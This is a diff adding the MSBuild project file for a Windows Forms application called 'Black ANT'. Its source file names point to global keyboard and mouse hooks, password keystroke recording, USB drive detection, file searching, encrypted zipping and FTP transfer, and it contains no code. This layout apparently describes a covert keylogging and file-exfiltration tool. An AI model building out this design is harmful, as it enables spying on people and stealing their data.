@@ -1,0 +1,264 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{046D3313-825F-4D4D-BAE7-E6EA63C1D6A2}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>Black_ANT</RootNamespace>
+    <AssemblyName>Black ANT</AssemblyName>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <TargetFrameworkProfile>
+    </TargetFrameworkProfile>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <PublishUrl>publish\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <ApplicationRevision>0</ApplicationRevision>
+    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <RunCodeAnalysis>false</RunCodeAnalysis>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>Black_ANT.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>Resources\BlackANT.ico</ApplicationIcon>
+  </PropertyGroup>
+  <PropertyGroup>
+    <SignAssembly>false</SignAssembly>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="AboutBox">
+      <HintPath>Resources\AboutBox.dll</HintPath>
+      <Private>False</Private>
+    </Reference>
+    <Reference Include="DVTextBox">
+      <HintPath>Resources\DVTextBox.dll</HintPath>
+      <Private>False</Private>
+    </Reference>
+    <Reference Include="FileExtension">
+      <HintPath>Resources\FileExtension.dll</HintPath>
+      <Private>False</Private>
+    </Reference>
+    <Reference Include="FileExtensionUserControl">
+      <HintPath>Resources\FileExtensionUserControl.dll</HintPath>
+      <Private>False</Private>
+    </Reference>
+    <Reference Include="Ionic.Zip">
+      <HintPath>Resources\Ionic.Zip.dll</HintPath>
+      <Private>False</Private>
+    </Reference>
+    <Reference Include="PictureBoxStatus">
+      <HintPath>Resources\PictureBoxStatus.dll</HintPath>
+      <Private>False</Private>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Numerics" />
+    <Reference Include="System.Threading.Tasks.Dataflow, Version=4.5.9.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>Resources\System.Threading.Tasks.Dataflow.dll</HintPath>
+      <Private>False</Private>
+    </Reference>
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="ComponentAssembly\ComponentController.cs" />
+    <Compile Include="ComponentAssembly\Shortcut.cs" />
+    <Compile Include="DiskDriveListener\DiskDriveChecker.cs" />
+    <Compile Include="DiskDriveListener\DiskDriveInsertionEventArgs.cs" />
+    <Compile Include="DiskProbe\CheckDirectoriesChanges.cs" />
+    <Compile Include="DiskProbe\SearchEngine.cs" />
+    <Compile Include="EventArguments\ReflectorEventList.cs" />
+    <Compile Include="EventArguments\ReportEventArgs.cs" />
+    <Compile Include="FTP\FileLibrary\FolderInfo.cs" />
+    <Compile Include="FTP\FileLibrary\FileInfoCollection.cs" />
+    <Compile Include="FTP\FileLibrary\FileInformation.cs" />
+    <Compile Include="FTP\FileLibrary\FileInformationCollection.cs" />
+    <Compile Include="FTP\FileLibrary\IUniqueList.cs" />
+    <Compile Include="FTP\FileLibrary\PackageFiles.cs" />
+    <Compile Include="FTP\FileLibrary\UniqueList.cs" />
+    <Compile Include="FTP\FileLibrary\UniqueSortedList.cs" />
+    <Compile Include="FTP\Transaction.cs" />
+    <Compile Include="MultipleActions.cs" />
+    <Compile Include="Security\ChangePassword.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Security\ChangePassword.Designer.cs">
+      <DependentUpon>ChangePassword.cs</DependentUpon>
+    </Compile>
+    <Compile Include="AppDataManager.cs" />
+    <Compile Include="Security\PasswordStrength.cs" />
+    <Compile Include="Security\PasswordStrengthControl.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="FTP\Zipper\FileNameEncoder.cs" />
+    <Compile Include="FTP\Zipper\ZipEncryption.cs" />
+    <Compile Include="Security\CryptorEngine.cs" />
+    <Compile Include="Kernel.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\HookUserActivity\HookToMyPassword.cs" />
+    <Compile Include="Security\NativeMethods.cs" />
+    <Compile Include="SolRegistry\RegistryHelper.cs" />
+    <Compile Include="GUI.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="GUI.Designer.cs">
+      <DependentUpon>GUI.cs</DependentUpon>
+    </Compile>
+    <Compile Include="MouseKeyboardActivityMonitor\BaseHookListener.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\Controls\HookType.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\Controls\MouseKeyEventProvider.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="MouseKeyboardActivityMonitor\HotKeys\HotKeyArgs.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\HotKeys\HotKeySet.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\HotKeys\HotKeySetCollection.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\HotKeys\HotKeySetsListener.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\KeyboardHookListener.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\KeyboardState.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\KeyEventArgsExt.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\KeyPressEventArgsExt.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\MouseEventExtArgs.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\MouseHookListener.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\WinApi\AppHooker.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\WinApi\GlobalHooker.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\WinApi\HookCallback.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\WinApi\Hooker.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\WinApi\HookNativeMethods.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\WinApi\KeyboardHookStruct.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\WinApi\KeyboardNativeMethods.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\WinApi\Messages.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\WinApi\MouseNativeMethods.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\WinApi\MouseStructures.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\WinApi\Point.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\WinApi\ThreadNativeMethods.cs" />
+    <Compile Include="MouseKeyboardActivityMonitor\HookUserActivity\RecordKeyPress.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Security\IOSecurity.cs" />
+    <Compile Include="Security\PasswordForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Security\PasswordForm.Designer.cs">
+      <DependentUpon>PasswordForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FTP\TransformPhysicalDisk.cs" />
+    <EmbeddedResource Include="GUI.resx">
+      <DependentUpon>GUI.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <EmbeddedResource Include="Security\ChangePassword.resx">
+      <DependentUpon>ChangePassword.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Security\PasswordForm.resx">
+      <DependentUpon>PasswordForm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Security\PasswordStrengthControl.resx">
+      <DependentUpon>PasswordStrengthControl.cs</DependentUpon>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Resources\BlackANT.ico" />
+    <EmbeddedResource Include="Resources\Ionic.Zip.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Resources\AboutBox.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include=".NETFramework,Version=v4.0,Profile=Client">
+      <Visible>False</Visible>
+      <ProductName>Microsoft .NET Framework 4 Client Profile %28x86 and x64%29</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1 Client Profile</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Windows.Installer.4.5">
+      <Visible>False</Visible>
+      <ProductName>Windows Installer 4.5</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Resources\System.Threading.Tasks.Dataflow.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Resources\DVTextBox.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Resources\FileExtension.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Resources\FileExtensionUserControl.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Resources\PictureBoxStatus.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
